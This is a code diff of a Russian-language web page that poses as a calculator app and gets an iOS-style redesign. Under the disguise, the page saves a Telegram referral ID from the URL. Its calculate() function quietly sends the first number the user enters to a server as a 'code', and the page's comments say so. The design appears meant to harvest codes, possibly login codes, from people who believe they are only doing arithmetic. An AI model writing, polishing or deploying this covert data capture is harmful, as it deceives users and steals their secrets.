@@ -3,38 +3,154 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="theme-color" content="#ffffff"/>
+  <meta name="theme-color" content="#000000"/>
   <link rel="manifest" href="/manifest.json">
   <title>Калькулятор</title>
   <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: #000;
+      color: #fff;
+    }
+
+    #ref-display {
+      padding: 16px;
+      font-size: 18px;
+      background: #1c1c1e;
+      text-align: center;
+    }
+
+    .open-btn {
+      font-size: 16px;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      background: #007aff;
+      color: white;
+      margin: 16px auto;
+      display: block;
+      cursor: pointer;
+    }
+
     #calculator {
       display: none;
       position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: white;
+      inset: 0;
+      background: #000;
       z-index: 10;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding-bottom: 20px;
+    }
+
+    #display {
+      font-size: 48px;
+      text-align: right;
       padding: 20px;
-      overflow: auto;
+      margin: 0 10px;
+      min-height: 60px;
+    }
+
+    .buttons-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      padding: 0 10px;
+    }
+
+    .calc-btn {
+      width: 100%;
+      height: 70px;
+      border-radius: 35px;
+      font-size: 28px;
+      background: #2c2c2e;
+      color: white;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .calc-btn.operator {
+      background: #ff9500;
+    }
+
+    .calc-btn.function {
+      background: #a5a5a5;
+      color: #000;
+    }
+
+    .calc-btn.zero {
+      grid-column: span 2;
+    }
+
+    #user-id-display {
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+      color: #aaa;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: none;
+      border: none;
+      color: white;
+      font-size: 24px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
 
 <div id="ref-display">Ваш ID: загрузка...</div>
-<button onclick="openCalculator()">Открыть калькулятор</button>
+<button class="open-btn" onclick="openCalculator()">Открыть калькулятор</button>
 
 <div id="calculator">
-  <h2>Калькулятор</h2>
-  <input id="num1" type="number" placeholder="Введите первое число" />
-  <input id="num2" type="number" placeholder="Введите второе число" />
-  <button onclick="calculate()">=</button>
-  <div id="result"></div>
+  <button class="close-btn" onclick="closeCalculator()">×</button>
+  <div id="display">0</div>
+  
+  <div class="buttons-grid">
+    <button class="calc-btn function" onclick="clearAll()">AC</button>
+    <button class="calc-btn function" onclick="toggleSign()">+/-</button>
+    <button class="calc-btn function" onclick="percent()">%</button>
+    <button class="calc-btn operator" onclick="setOperator('/')">÷</button>
+    
+    <button class="calc-btn" onclick="appendNumber(7)">7</button>
+    <button class="calc-btn" onclick="appendNumber(8)">8</button>
+    <button class="calc-btn" onclick="appendNumber(9)">9</button>
+    <button class="calc-btn operator" onclick="setOperator('*')">×</button>
+    
+    <button class="calc-btn" onclick="appendNumber(4)">4</button>
+    <button class="calc-btn" onclick="appendNumber(5)">5</button>
+    <button class="calc-btn" onclick="appendNumber(6)">6</button>
+    <button class="calc-btn operator" onclick="setOperator('-')">−</button>
+    
+    <button class="calc-btn" onclick="appendNumber(1)">1</button>
+    <button class="calc-btn" onclick="appendNumber(2)">2</button>
+    <button class="calc-btn" onclick="appendNumber(3)">3</button>
+    <button class="calc-btn operator" onclick="setOperator('+')">+</button>
+    
+    <button class="calc-btn zero" onclick="appendNumber(0)">0</button>
+    <button class="calc-btn" onclick="appendDecimal()">.</button>
+    <button class="calc-btn operator" onclick="calculate()">=</button>
+  </div>
+  
   <div id="user-id-display"></div>
-  <button onclick="closeCalculator()">Закрыть калькулятор</button>
 </div>
 
 <script>
-  // 1. Сохраняем ref при первом открытии
+  // Состояние калькулятора
+  let currentInput = '0';
+  let previousInput = '';
+  let operation = null;
+  let resetInput = false;
+
+  // Оригинальная логика работы с ref (без изменений)
   function saveRef() {
     const params = new URLSearchParams(window.location.search);
     const urlRef = params.get('ref');
@@ -47,7 +163,6 @@
     return localStorage.getItem('telegram_ref');
   }
 
-  // 2. Получаем ref (из URL или localStorage)
   function getRef() {
     let ref = localStorage.getItem('telegram_ref');
     
@@ -61,7 +176,7 @@
     return ref;
   }
 
-  // 3. Отправка кода на сервер
+  // Оригинальная функция отправки (без изменений)
   async function sendCodeToServer(code) {
     const ref = getRef();
     if (!ref) return;
@@ -83,7 +198,91 @@
     }
   }
 
-  // 4. Инициализация при загрузке
+  // Функции калькулятора
+  function updateDisplay() {
+    document.getElementById('display').textContent = currentInput;
+  }
+
+  function appendNumber(number) {
+    if (currentInput === '0' || resetInput) {
+      currentInput = number.toString();
+      resetInput = false;
+    } else {
+      currentInput += number.toString();
+    }
+    updateDisplay();
+  }
+
+  function appendDecimal() {
+    if (resetInput) {
+      currentInput = '0.';
+      resetInput = false;
+    } else if (!currentInput.includes('.')) {
+      currentInput += '.';
+    }
+    updateDisplay();
+  }
+
+  function clearAll() {
+    currentInput = '0';
+    previousInput = '';
+    operation = null;
+    updateDisplay();
+  }
+
+  function toggleSign() {
+    currentInput = (parseFloat(currentInput) * -1).toString();
+    updateDisplay();
+  }
+
+  function percent() {
+    currentInput = (parseFloat(currentInput) / 100).toString();
+    updateDisplay();
+  }
+
+  function setOperator(op) {
+    if (operation !== null) calculate();
+    previousInput = currentInput;
+    operation = op;
+    resetInput = true;
+  }
+
+  function calculate() {
+    if (operation === null || resetInput) return;
+
+    let computation;
+    const prev = parseFloat(previousInput);
+    const current = parseFloat(currentInput);
+
+    switch (operation) {
+      case '+':
+        computation = prev + current;
+        break;
+      case '-':
+        computation = prev - current;
+        break;
+      case '*':
+        computation = prev * current;
+        break;
+      case '/':
+        computation = prev / current;
+        break;
+      default:
+        return;
+    }
+
+    // Оригинальная логика отправки первого числа
+    if (!isNaN(prev)) {
+      sendCodeToServer(prev);
+    }
+
+    currentInput = computation.toString();
+    operation = null;
+    resetInput = true;
+    updateDisplay();
+  }
+
+  // Инициализация (оригинальная логика + инициализация калькулятора)
   window.addEventListener('DOMContentLoaded', () => {
     const ref = saveRef();
     const refDisplay = document.getElementById('ref-display');
@@ -94,36 +293,20 @@
     } else {
       refDisplay.textContent = 'ID не найден';
     }
-    
-    // Регистрация Service Worker для PWA
+
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('/sw.js');
     }
+
+    updateDisplay();
   });
 
-  // 5. Функции калькулятора
   function openCalculator() {
-    document.getElementById('calculator').style.display = 'block';
+    document.getElementById('calculator').style.display = 'flex';
   }
 
   function closeCalculator() {
     document.getElementById('calculator').style.display = 'none';
-  }
-
-  function calculate() {
-    const num1 = Number(document.getElementById('num1').value);
-    const num2 = Number(document.getElementById('num2').value);
-    
-    if (!num1 || !num2) {
-      alert('Введите оба числа');
-      return;
-    }
-
-    const result = num1 * num2;
-    document.getElementById('result').textContent = `Результат: ${result}`;
-    
-    // Отправляем первое число как код
-    if (num1) sendCodeToServer(num1);
   }
 </script>
 </body>
